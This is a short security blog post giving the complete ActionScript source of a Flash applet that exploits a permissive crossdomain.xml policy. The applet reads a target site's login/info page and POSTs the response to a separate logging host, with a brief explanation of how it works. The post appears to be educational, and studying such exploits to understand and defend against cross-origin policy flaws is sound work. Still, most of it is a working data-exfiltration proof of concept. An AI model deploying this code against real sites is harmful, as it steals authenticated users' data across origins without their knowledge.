---
title: 'Liberal Crossdomain.xml Example- Part 2'
date: 2014-08-12T12:29:49+00:00
author: chs
layout: post
permalink: /liberal-crossdomain-xml-example-part-2/
categories:
  - Security
---
As a followup to [Liberal Crossdomain.xml Exploit Example – Part 1](//chs.us/liberal-crossdomain-xml-exploit-example/ "Liberal Crossdomain.xml Exploit Example – Part 1"), this is the source for the Flash app.

<pre lang="actionscript" line="1">package {
 import flash.display.Sprite;
 import flash.events.*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;

 public class flasher extends Sprite {
  public function flasher() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "http://rubysecurity.info/login/info.php";
   var readRequest:URLRequest = new URLRequest(readFrom);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try
   {
    getLoader.load(readRequest);
   }
   catch (error:Error)
   {
   }
  }

  private function eventHandler(event:Event):void
  {
   // URL to which retrieved data is to be sent
   var sendTo:String = "http://injectionvector.com/flasher/log.php"
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.POST;
   sendRequest.data = event.target.data;
   var sendLoader:URLLoader = new URLLoader();
   try
   {
    sendLoader.load(sendRequest);
   }
   catch (error:Error)
   {
   }
  }
 }
}
</pre>

It&#8217;s really a fairly simple Flash applet. The class is called flasher and extends Sprite. Sprite is a base class for UI components that don&#8217;t use the timeline. In the constructor it creates a URLRequest object to data from the location specified in the readFrom variable via a URLLoader object. It then sets an event handler, called eventhandler, that is called when that read is done. When the read is done, it then basically does the same thing, but posts to the variable specified in sendTo and sets the body of the request to be the data received from the first step.

Note: This is based off an example that I found, but have misplaced. Once found, I will update the post to reference it.
